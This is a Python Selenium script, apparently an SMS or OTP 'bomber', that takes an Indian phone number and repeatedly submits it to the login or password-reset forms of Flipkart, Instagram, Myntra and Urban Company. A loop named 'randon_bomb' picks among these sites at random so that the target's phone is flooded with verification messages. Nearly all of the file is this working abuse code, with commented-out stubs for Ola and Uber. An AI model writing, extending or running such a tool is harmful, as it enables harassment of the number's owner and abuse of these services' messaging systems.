import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import re


# Initialize Driver
def Driver():
    PATH = "../Drivers/chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    return driver

def validate(num):
    re_num = r"(0|91)?[7-9][0-9]{9}"
    f = bool(re.match(re_num, num))
    return f

def flipkart(num):
    if validate(num) == True:
        driver = Driver()
        driver.get("https://www.flipkart.com/account/login?ret=/")
        number = driver.find_element_by_xpath('/html/body/div/div/div[3]/div/div[2]/div/form/div[1]/input')
        forgot = driver.find_element_by_xpath('/html/body/div/div/div[3]/div/div[2]/div/form/div[2]/a/span')
        number.send_keys(num)
        forgot.click()
    else:
        print("Invalid number")

def instagram(num):
    if validate(num) == True:
        driver = Driver()
        driver.get("https://www.instagram.com/accounts/password/reset/")
        number = driver.find_element_by_tag_name("input")
        number.send_keys(num)
        number.send_keys(Keys.RETURN)
    else:
        print("Invalid number")

def myntra(num):
    if validate(num) == True:
        driver = Driver()
        driver.get("https://www.myntra.com/login")
        number = driver.find_element_by_xpath("/html/body/div[2]/div/div[2]/div[3]/div[2]/div/div/div[1]/div/div/div[2]/div[2]/div[1]/input")
        number.send_keys(num)
        number.send_keys(Keys.RETURN)
    else:
        print("Invalid number")

def urbanclap(num):
    if validate(num) == True:
        driver = Driver()
        driver.get("https://www.urbancompany.com/")
        Click = driver.find_element_by_xpath("//*[@id='city-desktop-container']/main/div[1]/header/div/div/ul/li[3]/div")
        Click.click()
        number = driver.find_element_by_xpath("/ html / body / div[2] / div / div / div / div / div / div / div / div / div[2] / div[1] / div / div[2] / input")
        number.send_keys(num)
        number.send_keys(Keys.RETURN)
    else:
        print("Invalid number")

'''
def ola(num):
    driver.get("https://book.olacabs.com/login")

    element = driver.find_element_by_xpath("/html/body/ola-app//ola-notification//div/div/div[2]/button")
    print(element)
    time.sleep(1000)

    element.click()
'''
'''
def uber():
    driver.get("https://auth.uber.com/login/")
    number = driver.find_element_by_tag_name("input")
    number.send_keys("num")
    number.send_keys(Keys.RETURN)
'''


def randon_bomb(freq, num):
    for i in range(0, freq + 1):
        ran = random.randint(0, 4)

        if ran == 1:
            instagram(num)

        if ran == 2:
            flipkart(num)

        if ran == 3:
            myntra(num)

        if ran == 4:
            urbanclap(num)